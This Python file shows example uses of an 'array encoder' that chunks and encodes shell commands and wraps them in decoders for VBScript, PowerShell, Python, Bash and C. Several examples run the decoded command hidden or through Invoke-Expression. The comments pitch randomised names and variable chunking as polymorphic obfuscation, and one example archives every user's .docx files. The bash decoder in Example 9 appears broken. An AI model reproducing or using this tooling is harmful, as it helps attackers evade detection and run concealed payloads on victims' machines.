#!/usr/bin/env python3
"""
Array Encoder - Practical Usage Examples
Demonstrates real-world usage patterns and integration scenarios
"""

from array_encoder import (
    ArrayEncoder, EncoderConfig, EncodingType, OutputFormat,
    ChunkingStrategy, encode_command_to_array
)
import json


def example_1_basic_vbs_payload():
    """Example 1: Basic VBScript payload generation"""
    print("\n" + "=" * 70)
    print("EXAMPLE 1: Basic VBScript Payload Generation")
    print("=" * 70)

    cmd = "calc.exe"

    vbs_array = encode_command_to_array(
        cmd,
        chunk_size=16,
        encoding="hex",
        output_format="vbs",
        variable_name="cmd_array"
    )

    print(f"Command: {cmd}")
    print(f"Output format: VBScript")
    print(f"\nGenerated VBS Array:\n{vbs_array}")

    # Combine with decoder
    full_payload = """
' ========== PAYLOAD ARRAY ==========
""" + vbs_array + """

' ========== DECODER FUNCTION ==========
Function DecodeHex(hexStr)
    Dim result, i
    For i = 1 To Len(hexStr) Step 2
        result = result & Chr(CLng("&H" & Mid(hexStr, i, 2)))
    Next
    DecodeHex = result
End Function

' ========== EXECUTION ==========
Dim command
command = ""
For i = 0 To UBound(cmd_array)
    command = command & DecodeHex(cmd_array(i))
Next

' Hidden execution
CreateObject("WScript.Shell").Run command, 0, False
"""

    print("\nFull VBS Payload with Decoder:\n" + full_payload)
    return full_payload


def example_2_powershell_obfuscation():
    """Example 2: PowerShell command obfuscation"""
    print("\n" + "=" * 70)
    print("EXAMPLE 2: PowerShell Command Obfuscation")
    print("=" * 70)

    cmd = "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Get-Process | Where-Object {$_.CPU -gt 100} | Stop-Process\""

    ps_code = encode_command_to_array(
        cmd,
        chunk_size=20,
        encoding="hex",
        output_format="powershell",
        variable_name="encoded_command"
    )

    print(f"Original command: {cmd}")
    print(f"\nEncoded for PowerShell:\n{ps_code}")

    # PowerShell decoder
    ps_decoder = """
# ========== ENCODED COMMAND ==========
""" + ps_code + """

# ========== DECODER FUNCTION ==========
function Decode-HexString {
    param([string]$HexString)
    $result = @()
    for ($i = 0; $i -lt $HexString.Length; $i += 2) {
        $result += [char]([convert]::toint16($HexString.Substring($i, 2), 16))
    }
    return -join $result
}

# ========== RECONSTRUCTION ==========
$command = ""
foreach ($chunk in $encoded_command) {
    $command += Decode-HexString $chunk
}

# ========== EXECUTION ==========
Invoke-Expression $command
"""

    print(f"\nFull PowerShell Payload:\n{ps_decoder}")
    return ps_decoder


def example_3_multiple_formats():
    """Example 3: Generate same command in multiple formats"""
    print("\n" + "=" * 70)
    print("EXAMPLE 3: Cross-Platform Encoding")
    print("=" * 70)

    cmd = "whoami"

    formats = [
        ("Python", "python"),
        ("VBScript", "vbs"),
        ("JavaScript", "js"),
        ("PowerShell", "ps"),
        ("Bash", "bash"),
        ("JSON", "json"),
    ]

    results = {}

    for name, fmt in formats:
        result = encode_command_to_array(
            cmd,
            chunk_size=8,
            encoding="hex",
            output_format=fmt,
            variable_name="payload"
        )
        results[name] = result
        print(f"\n--- {name} ---")
        print(result[:300] + ("..." if len(result) > 300 else ""))

    return results


def example_4_json_api_format():
    """Example 4: JSON format for API/programmatic use"""
    print("\n" + "=" * 70)
    print("EXAMPLE 4: JSON Format for API Integration")
    print("=" * 70)

    cmd = "cmd.exe /c dir"

    json_output = encode_command_to_array(
        cmd,
        chunk_size=12,
        encoding="hex",
        output_format="json"
    )

    print(f"Command: {cmd}")
    print(f"\nJSON Output:\n{json_output}")

    # Parse and work with JSON
    data = json.loads(json_output)
    print(f"\nParsed JSON:")
    print(f"  Chunks: {len(data['payload'])}")
    print(f"  Encoding: {data['encoding']}")
    print(f"  Chunk Size: {data['chunk_size']}")

    # Can be easily integrated with APIs, databases, etc.
    return data


def example_5_base64_encoding():
    """Example 5: Base64 encoding for ASCII-safe transmission"""
    print("\n" + "=" * 70)
    print("EXAMPLE 5: Base64 Encoding")
    print("=" * 70)

    cmd = "systeminfo"

    b64_code = encode_command_to_array(
        cmd,
        chunk_size=10,
        encoding="base64",
        output_format="python",
        variable_name="encoded_cmd"
    )

    print(f"Command: {cmd}")
    print(f"Encoding: Base64")
    print(f"\nGenerated Python Code:\n{b64_code}")

    # Base64 decoder in Python
    python_decoder = """
import base64

""" + b64_code + """

# Decode function
def decode_base64_chunks(chunks):
    result = ""
    for chunk in encoded_cmd:
        result += base64.b64decode(chunk).decode('utf-8')
    return result

# Reconstruct and execute
command = decode_base64_chunks(encoded_cmd)
print(f"Decoded command: {command}")
import subprocess
subprocess.run(command, shell=True)
"""

    print(f"\nFull Python Decoder:\n{python_decoder}")
    return python_decoder


def example_6_variable_chunking():
    """Example 6: Variable-sized chunks for polymorphism"""
    print("\n" + "=" * 70)
    print("EXAMPLE 6: Variable-Sized Chunks")
    print("=" * 70)

    cmd = "rundll32.exe shell32.dll,ShellExec_RunDLL"

    config = EncoderConfig(
        chunk_size=16,
        encoding_type=EncodingType.HEX,
        output_format=OutputFormat.PYTHON,
        chunking_strategy=ChunkingStrategy.VARIABLE_SIZE,
        min_chunk_size=6,
        max_chunk_size=20,
        variable_name="obfuscated_payload"
    )

    encoder = ArrayEncoder(config)
    result = encoder.generate(cmd)

    print(f"Command: {cmd}")
    print(f"Chunking: Variable-sized (min=6, max=20)")
    print(f"\nGenerated Code:\n{result}")

    return result


def example_7_randomized_names():
    """Example 7: Randomized variable names for obfuscation"""
    print("\n" + "=" * 70)
    print("EXAMPLE 7: Randomized Variable Names")
    print("=" * 70)

    cmd = "tasklist.exe"

    print(f"Command: {cmd}")
    print(f"Randomizing variable names...\n")

    # Generate multiple variations
    for i in range(3):
        config = EncoderConfig(
            chunk_size=8,
            encoding_type=EncodingType.HEX,
            output_format=OutputFormat.PYTHON,
            randomize_names=True,
            variable_name="payload",
            add_comments=False
        )
        encoder = ArrayEncoder(config)
        result = encoder.generate(cmd)
        print(f"Variation {i+1}:")
        print(result)
        print()

    return "Generated 3 variations with randomized names"


def example_8_long_command():
    """Example 8: Encoding longer, real-world command"""
    print("\n" + "=" * 70)
    print("EXAMPLE 8: Long Real-World Command")
    print("=" * 70)

    cmd = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-ChildItem -Path C:\\Users\\* -Filter *.docx -Recurse | Compress-Archive -DestinationPath C:\\temp\\docs.zip"'

    config = EncoderConfig(
        chunk_size=32,
        encoding_type=EncodingType.HEX,
        output_format=OutputFormat.VBS,
        variable_name="cmd_chunks"
    )

    encoder = ArrayEncoder(config)
    result = encoder.generate(cmd)

    print(f"Command length: {len(cmd)} characters")
    print(f"Generated VBS (first 500 chars):\n")
    print(result[:500] + "\n...")

    # Statistics
    chunks = encoder.encode(cmd)
    print(f"\nStatistics:")
    print(f"  Number of chunks: {chunks['count']}")
    print(f"  Chunk size: 32 bytes")
    print(f"  Total hex output: {sum(len(c) for c in chunks['chunks'])} characters")

    return result


def example_9_octal_encoding():
    """Example 9: Octal encoding for shell-based obfuscation"""
    print("\n" + "=" * 70)
    print("EXAMPLE 9: Octal Encoding")
    print("=" * 70)

    cmd = "/bin/bash"

    config = EncoderConfig(
        chunk_size=4,
        encoding_type=EncodingType.OCTAL,
        output_format=OutputFormat.BASH,
        variable_name="encoded_cmd"
    )

    encoder = ArrayEncoder(config)
    result = encoder.generate(cmd)

    print(f"Command: {cmd}")
    print(f"Encoding: Octal")
    print(f"\nGenerated Bash Code:\n{result}")

    # Note: Octal is useful for shell injection and printf obfuscation
    bash_decoder = """
# Octal-encoded command
""" + result + """

# Decode using printf
decoded_cmd=$'\\
#!/bin/bash
# Reconstruct from octal
decoded=""
for chunk in ${encoded_cmd[@]}; do
    decoded="${decoded}$(printf %b \\\\$(echo $chunk | sed 's/../\\0x&/g'))"
done
echo $decoded
"""

    print(f"\nWith Decoder:\n{bash_decoder}")
    return result


def example_10_c_array_format():
    """Example 10: C/C++ array format for compiled payloads"""
    print("\n" + "=" * 70)
    print("EXAMPLE 10: C/C++ Array Format")
    print("=" * 70)

    cmd = "cmd.exe"

    c_code = encode_command_to_array(
        cmd,
        chunk_size=8,
        encoding="hex",
        output_format="c",
        variable_name="cmd_payload"
    )

    print(f"Command: {cmd}")
    print(f"Output format: C/C++")
    print(f"\nGenerated C Code:\n{c_code}")

    # Full C program example
    full_c_program = """
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

""" + c_code + """

// Hex decode function
char* hex_decode(const char* hex_str) {
    int len = strlen(hex_str);
    char* result = malloc(len / 2 + 1);
    for (int i = 0, j = 0; i < len; i += 2, j++) {
        sscanf(hex_str + i, "%2hhx", &result[j]);
    }
    result[len / 2] = '\\0';
    return result;
}

int main() {
    // Reconstruct command
    char command[256] = "";
    for (int i = 0; i < cmd_payload_len; i++) {
        char* decoded = hex_decode(cmd_payload[i]);
        strcat(command, decoded);
        free(decoded);
    }

    printf("Decoded command: %s\\n", command);

    // Can execute: system(command);

    return 0;
}
"""

    print(f"\nFull C Program:\n{full_c_program}")
    return full_c_program


def example_11_mixed_encoding():
    """Example 11: Mixed encoding for polymorphic payloads"""
    print("\n" + "=" * 70)
    print("EXAMPLE 11: Mixed Encoding (Polymorphic)")
    print("=" * 70)

    cmd = "test.exe"

    config = EncoderConfig(
        chunk_size=4,
        encoding_type=EncodingType.MIXED,
        output_format=OutputFormat.JSON,
        variable_name="polymorphic_payload"
    )

    encoder = ArrayEncoder(config)
    result = encoder.generate(cmd)

    print(f"Command: {cmd}")
    print(f"Encoding: Mixed (randomizes between hex/base64)")
    print(f"\nGenerated JSON:\n{result}")

    # Parse to show mixed encodings
    data = json.loads(result)
    print(f"\nNote: Due to random mixing, chunks may use different encodings.")
    print(f"Run again to see different mix patterns.")

    return result


def example_12_interleaved_chunks():
    """Example 12: Interleaved chunking strategy"""
    print("\n" + "=" * 70)
    print("EXAMPLE 12: Interleaved Chunking")
    print("=" * 70)

    cmd = "command line string"

    config = EncoderConfig(
        chunk_size=4,
        encoding_type=EncodingType.HEX,
        output_format=OutputFormat.PYTHON,
        chunking_strategy=ChunkingStrategy.INTERLEAVED,
        variable_name="interleaved_payload"
    )

    encoder = ArrayEncoder(config)
    result = encoder.generate(cmd)

    print(f"Command: {cmd}")
    print(f"Strategy: Interleaved (even indices, then odd)")
    print(f"\nGenerated Code:\n{result}")

    encoded_data = encoder.encode(cmd)
    print(f"\nChunk Information:")
    print(f"  Total chunks: {encoded_data['count']}")
    print(f"  Original order indices: {encoded_data['order']}")

    return result


def run_all_examples():
    """Run all examples"""
    print("\n" + "=" * 70)
    print("ARRAY ENCODER - PRACTICAL USAGE EXAMPLES")
    print("=" * 70)

    examples = [
        ("Basic VBScript Payload", example_1_basic_vbs_payload),
        ("PowerShell Obfuscation", example_2_powershell_obfuscation),
        ("Multiple Formats", example_3_multiple_formats),
        ("JSON API Format", example_4_json_api_format),
        ("Base64 Encoding", example_5_base64_encoding),
        ("Variable Chunking", example_6_variable_chunking),
        ("Randomized Names", example_7_randomized_names),
        ("Long Command", example_8_long_command),
        ("Octal Encoding", example_9_octal_encoding),
        ("C/C++ Array Format", example_10_c_array_format),
        ("Mixed Encoding", example_11_mixed_encoding),
        ("Interleaved Chunks", example_12_interleaved_chunks),
    ]

    for name, func in examples:
        try:
            func()
        except Exception as e:
            print(f"\n[ERROR] {name}: {e}")

    print("\n" + "=" * 70)
    print("ALL EXAMPLES COMPLETED")
    print("=" * 70)


if __name__ == "__main__":
    run_all_examples()
